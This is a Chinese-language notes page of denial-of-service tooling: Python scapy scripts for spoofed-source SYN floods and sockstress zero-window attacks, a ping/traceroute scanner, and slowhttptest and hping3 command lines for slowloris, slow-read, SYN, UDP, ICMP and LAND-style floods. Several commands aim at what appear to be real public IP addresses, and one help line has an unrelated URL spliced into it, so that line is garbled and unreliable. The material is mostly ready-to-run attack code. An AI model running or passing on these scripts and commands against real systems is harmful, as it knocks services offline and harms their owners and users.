1、syn 攻击

```javascript
#coding=utf-8
import socket, sys, random
from kamene.all import *
import time, threading

# scapy.config.conf.iface = 'Realtek PCIe GBE Family Controller'

# windows 系统半开连接数是10个
# iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.1.10 -j DROP
# 匹配所有半开放链接 netstat -n | awk '/^tcp/ {++S[$NF]} END{for(a in S) print a,S[a]}'
# ip = IP()
# ip.dst="192.168.1.10"
# tcp=TCP()
# sr1(ip/tcp,verbose=1,timeout=3)
# sr1(IP(dst="192.168.1.10")/TCP())
def Attack():
    target = "172.20.30.52"
    dstport = 22
    isrc = '%i.%i.%i.%i' % (random.randint(1,254),random.randint(1,254),random.randint(1,254), random.randint(1,254))
    # isrc = "172.20.30.71"
    print(isrc,dstport)

    isport = random.randint(1,65535)
    ip = IP(src = isrc,dst = target)
    syn = TCP(sport = isport, dport = dstport, flags = 'S')
    send(ip / syn, verbose = 0)

for i in range(600):
    t = threading.Thread(target=Attack)
    t.start()
```



2、tcp攻击





```javascript
#coding=utf-8
# iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 被害IP -j DROP
from optparse import OptionParser
import socket,sys,random,threading
from kamene.all import *

# scapy.config.conf.iface = 'ens32'

# 攻击目标主机的Window窗口,实现目标主机内存CPU等消耗殆尽
def sockstress(target,dstport):
    semaphore.acquire()       # 加锁
    isport = random.randint(0,65535)
    response = sr1(IP(dst=target)/TCP(sport=isport,dport=dstport,flags="S"),timeout=1,verbose=0)
    send(IP(dst=target)/ TCP(dport=dstport,sport=isport,window=0,flags="A",ack=(response[TCP].seq +1))/'\x00\x00',verbose=0)
    print("[+] sendp --> {} {}".format(target,isport))
    semaphore.release()       # 释放锁

# 攻击目标主机TCP/IP半开放连接数,windows系统半开连接数是10个
def synflood(target,dstport):
    semaphore.acquire()       # 加锁
    issrc = '%i.%i.%i.%i' % (random.randint(1,254),random.randint(1,254),random.randint(1,254), random.randint(1,254))
    isport = random.randint(1,65535)
    ip = IP(src = issrc,dst = target)
    syn = TCP(sport = isport, dport = dstport, flags = 'S')
    send(ip / syn, verbose = 0)
    print("[+] sendp --> {} {}".format(target,isport))
    semaphore.release()       # 释放锁

if __name__ == "__main__":
    parser = OptionParser()
    parser.add_option("-H","--host",dest="host",type="string",help="输入被攻击主机IP地址")
    parser.add_option("-p","--port",dest="port",type="int",help="输入被攻击主机端口")
    parser.add_option("--type",dest="types",type="string",help="指定攻击的载荷 (synflood/sockstress)")
    parser.add_option("-t","--thread",dest="thread",type="int",help="指定攻击并发线程数")
    (options,args) = parser.parse_args()
    # 使用方式: main.py --type=synflood -H 192.168.1.1 -p 80 -t 10
    if options.types == "synflood" and options.host and options.port and options.thread:
        semaphore = threading.Semaphore(options.thread)
        while True:
            t = threading.Thread(target=synflood,args=(options.host,options.port))
            t.start()
    elif options.types == "sockstress" and options.host and options.port and options.thread:
        semaphore = threading.Semaphore(options.thread)
        while True:
            t = threading.Thread(target=sockstress,args=(options.host,options.port))
            t.start()
    else:
        parser.print_help()

# 使用syn flood 攻击方式:python3 c.py --type=synflood -H 192.168.1.10 -p 3389 -t 100
# 使用sock并发攻击: python3 c.py --type=sockstress -H 192.168.1.10 -p 80 -t 100


```



3、跟踪脚本



```javascript
from kamene.all import *
from random import randint
import time,ipaddress,threading
from optparse import OptionParser

def ICMP_Ping(addr):
    RandomID=randint(1,65534)
    packet = IP(dst=addr, ttl=64, id=RandomID) / ICMP(id=RandomID, seq=RandomID) / "lyshark"
    respon = sr1(packet,timeout=3,verbose=0)
    if respon:
        print("[+] --> {}".format(str(respon[IP].src)))

def TraceRouteTTL(addr):
    for item in range(1,128):
        RandomID=randint(1,65534)
        packet = IP(dst=addr, ttl=item, id=RandomID) / ICMP(id=RandomID, seq=RandomID)
        respon = sr1(packet,timeout=3,verbose=0)
        if respon != None:
            ip_src = str(respon[IP].src)
            if ip_src != addr:
                print("[+] --> {}".format(str(respon[IP].src)))
            else:
                print("[+] --> {}".format(str(respon[IP].src)))
                return 1
        else:
            print("[-] --> TimeOut")
        time.sleep(1)

if __name__== "__main__":
    parser = OptionParser()
    parser.add_option("--mode",dest="mode",help="选择使用的工具模式<ping/trace>")
    parser.add_option("-a","--addr",dest="addr",help="指定一个IP地址或范围")
    (options,args) = parser.parse_args()
    # 使用方式: main.py --mode=ping -a 192.168.1.0/24
    if options.mode == "ping":
        net = ipaddress.ip_network(str(options.addr))
        for item in net:
            t = threading.Thread(target=ICMP_Ping,args=(str(item),))
            t.start()
    # 使用方式: main.py --mode=trace -a 61.135.169.121
    elif options.mode == "trace":
        TraceRouteTTL(str(options.addr))
    else:
        parser.print_help()
```

4、slowhttptest

yum install autoconf openssl-devel gcc-c++

lyshark@Dell:~$ git clone https://github.com/shekyan/slowhttptest.git

lyshark@Dell:~$ ./configure

lyshark@Dell:~$ make && make install

lyshark@Dell:~$ slowhttptest --help



 -g      在测试完成后，以时间戳为名生成一个CVS和HTML文件的统计数据

 -H      SlowLoris模式

 -B      Slow POST模式

 -R      Range Header模式

 -X      Slow Read模式

 -c      number of connections 测试时建立的连接数

 -d      HTTP proxy host:port  为所有连接指定代理

 -e      HTTP proxy host:port  为探测连接指定代理

 -i      seconds 在slowrois和Slow POST模式中，指定发送数据间的间隔。

 -l      seconds 测试维持时间

 -n      seconds 在Slow Read模式下，指定每次操作的时间间隔。

 -o      file name 使用-g参数时，可https://dosxyz.com:8899/?u=http://xinhao999.com/&p=/以使用此参数指定输出文件名

 -p      seconds 指定等待时间来确认DoS攻击已经成功

 -r      connections per second 每秒连接个数

 -s      bytes 声明Content-Length header的值

 -t      HTTP verb 在请求时使用什么操作，默认GET

 -u      URL  指定目标url

 -v      level 日志等级（详细度）

 -w      bytes slow read模式中指定tcp窗口范围下限

 -x      bytes 在slowloris and Slow POST tests模式中，指定发送的最大数据长度

 -y      bytes slow read模式中指定tcp窗口范围上限

 -z      bytes 在每次的read()中，从buffer中读取数据量

2.使用方式.



slowloris模式：耗尽应用的并发连接池，类似于HTTP层的syn flood 洪水攻击



slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -t GET -u https://www.xxx.com/index.html -x 24 -p 3



slow post模式：耗尽应用的并发连接池，类似于HTTP层的syn flood 洪水攻击



slowhttptest -c 3000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u https://www.xxx.com/index.html -x 10 -p 3



slow read模式：攻击者通过调整TCP Window窗口大小，使服务器慢速返回数据



slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u https://www.xxx.com/index.html -p 3

Hping3: 工具的使用,该工具灵活性极高，常用于定制发送TCP/IP数据包，例如定制SYN Flood攻击包，ICMP/UDP等攻击



Docker 用法

docker run -it  --rm shekyan/slowhttptest    -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://119.8.41.242 -p 3



docker run -it  --rm shekyan/slowhttptest    -c 60000 -X -r 5000 -w 512 -y 65530 -n 5 -z 32 -k 3 -u http://119.8.41.242 -p 3

docker run -it  --rm shekyan/slowhttptest    -c 50000 -H -g -o my_header_stats -i 10 -r 20000 -t GET -u http://119.8.41.242 -x 24 -p 3





# 进行Syn Flood攻击， -c=攻击次数/ -d=数据包大小/ -S=Syn/ -p=端口 / -w = window窗口大小 / --flood=洪水攻击 --rand-source=随机源地址

hping3 - c 2000 -d 100 -S -w 64 -p 80 --flood --rand-source 192.168.1.10

hping3 -S -P -U -p 80 --flood --rand-source 192.168.1.10



# 进行TCP Flood攻击，

hping3 -SARFUP -p 80 --flood --rand-source 192.168.1.10



# 进行UDP flood 攻击

hping3 -a 192.168.1.10 --udp -s 53 -d 100 -p 53 --flood 192.168.1.10



# 进行ICMP攻击

hping3 -q -n -a 192.168.1.10 --icmp -d 56 --flood 192.168.1.10



# 特殊TCP攻击：源地址目标地址都是受害者，受害者自己完成三次握手

hping3 -n -a 192.168.1.10 -S -d 100 -p 80 --flood 192.168.1.10



```javascript
docker run --rm sflow/hping3 -c 20000 -d 100 -S -w 64 -p 8899 --flood --rand-source 23.225.154.245
```

